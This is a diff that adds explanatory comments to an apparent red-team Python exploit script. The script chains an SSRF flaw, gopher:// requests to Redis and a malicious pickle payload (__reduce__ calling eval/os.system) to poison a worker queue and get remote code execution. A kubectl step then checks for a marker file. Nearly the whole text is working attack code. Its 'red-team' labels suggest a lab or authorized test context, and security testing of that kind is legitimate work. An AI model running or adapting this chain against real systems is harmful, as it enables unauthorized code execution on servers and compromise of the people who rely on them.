@@ -6,16 +6,19 @@ import urllib.parse
 import requests
 
 
+# Pickle payload that runs a shell command when deserialized by a vulnerable worker.
 class RCEPayload:
     def __init__(self, command: str):
         self.command = command
 
     def __reduce__(self):
+        # __reduce__ controls how pickle rebuilds the object; we abuse it for RCE.
         expression = f"__import__('os').system({self.command!r})"
         return (eval, (expression,))
 
 
 def build_resp_command(parts: list[bytes]) -> bytes:
+    # Encode a raw Redis command using the RESP protocol for LPUSH/LLEN.
     frame = [f"*{len(parts)}\r\n".encode("utf-8")]
     for part in parts:
         frame.append(f"${len(part)}\r\n".encode("utf-8"))
@@ -25,6 +28,7 @@ def build_resp_command(parts: list[bytes]) -> bytes:
 
 
 def send_redis_via_ssrf(web_base_url: str, redis_host: str, redis_port: int, command: bytes) -> requests.Response:
+    # Abuse SSRF + gopher to send raw Redis bytes through the vulnerable /fetch endpoint.
     gopher_url = (
         f"gopher://{redis_host}:{redis_port}/_"
         f"{urllib.parse.quote_from_bytes(command, safe='')}"
@@ -37,6 +41,7 @@ def send_redis_via_ssrf(web_base_url: str, redis_host: str, redis_port: int, com
 
 
 def verify_marker_with_kubectl(namespace: str, marker_path: str) -> tuple[bool, str]:
+    # Optional verification: read the marker file from the vulnerable worker pod.
     result = subprocess.run(
         [
             "kubectl",
@@ -74,6 +79,7 @@ def main() -> None:
     parser.add_argument("--marker-path", default="/tmp/redteam_owned.txt")
     args = parser.parse_args()
 
+    # Attacker-controlled pickle; unsafe deserialization in the worker triggers the command.
     malicious_pickle = pickle.dumps(RCEPayload(args.rce_command), protocol=4)
     lpush_command = build_resp_command([b"LPUSH", args.queue.encode("utf-8"), malicious_pickle])
 
@@ -87,6 +93,7 @@ def main() -> None:
     print("[red-team] SSRF request status:", response.status_code)
     print("[red-team] SSRF response body:", response.text)
 
+    # Basic signal that the queue was poisoned.
     llen_command = build_resp_command([b"LLEN", args.queue.encode("utf-8")])
     llen_response = send_redis_via_ssrf(
         web_base_url=args.web_base_url,
